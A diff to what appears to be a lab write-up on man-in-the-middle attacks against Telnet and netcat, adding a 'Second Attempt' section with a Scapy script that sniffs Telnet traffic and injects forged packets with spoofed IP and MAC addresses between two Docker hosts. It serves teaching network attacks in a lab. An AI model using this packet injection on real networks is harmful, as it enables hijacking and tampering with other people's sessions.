@@ -193,8 +193,37 @@ f = 'tcp and host 10.9.0.5 and host 10.9.0.6'
 pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt) # Sniff the traffic between Host A and Host B
 ```
 
-This script replaces each typed character in Telnet with the character 'Z', and also allows for redirecting the TCP packets to a spoofed address. Note that I added a new variable ```IP_M``` for the spoofed IP address and ```MAC_M``` for the spoofed MAC address, and modified the ```spoof_pkt()``` function to create and send the spoofed packets.
+### Second Attempt
+This script replaces each typed character in Telnet with the character 'Z', and also allows for redirecting the TCP packets to a spoofed address. Note that I added a new variable ```IP_M``` for the spoofed IP address and ```MAC_M``` for the spoofed MAC address, and modified the ```spoof_pkt()``` function to create and send the spoofed packets. <br/>
+<br/>
+The script does not necessarily need to start with ```#!/usr/bin/env python3``` as it is not required for the script to run. However, it is a common practice to include this line at the beginning of a Python script so that the operating system can find the Python interpreter and execute the script properly.<br/>
+<br/>
+Regarding the IP and MAC addresses, these continue to be required for the script to work properly. I could a script where it will assume that Host A and Host B are on the same network segment and that their IP and MAC addresses can be automatically discovered through the ARP cache. (Needs testing!!!). However, it is always a good practice to specify the IP and MAC addresses explicitly to ensure that the packets are sent to the correct destination. <br/>
+<br/>
+Here is an alternative version of the script that I have been testing:
 
+```
+from scapy.all import *
+
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+
+def telnet_listener(pkt):
+    if pkt.haslayer(TCP) and pkt[TCP].dport == 23 and pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode('utf-8', errors='ignore').strip()
+        if payload == 'Nigel Douglas':
+            response = 'AAAAA Douglas'
+            response_pkt = Ether(dst=MAC_A, src=MAC_B) / IP(dst=IP_A, src=IP_B) / TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport, flags='A') / Raw(load=response)
+            sendp(response_pkt, verbose=False)
+
+sniff(filter='tcp', prn=telnet_listener)
+```
+
+In this version of the script, the IP and MAC addresses for Host A and Host B are explicitly defined at the beginning of the script. The response_pkt is constructed using the specified IP and MAC addresses instead of relying on automatic ARP resolution. The sendp function is used instead of send to send the packet at the data link layer. <br/>
+<br/>
+Note that the MAC addresses in this example are using Docker's default networking setup, which is why they start with ```02:42```. Your MAC addresses may be different depending on your network setup. You can find the MAC addresses for Host A and Host B using the ifconfig command on each host.
 
 ## Launching an  MitM Attack on Netcat
 To modify the previous script to replace every occurrence of a first name in the message with a sequence of A's in the TCP packets exchanged between Host A and Host B communicating via netcat, I added the below code:
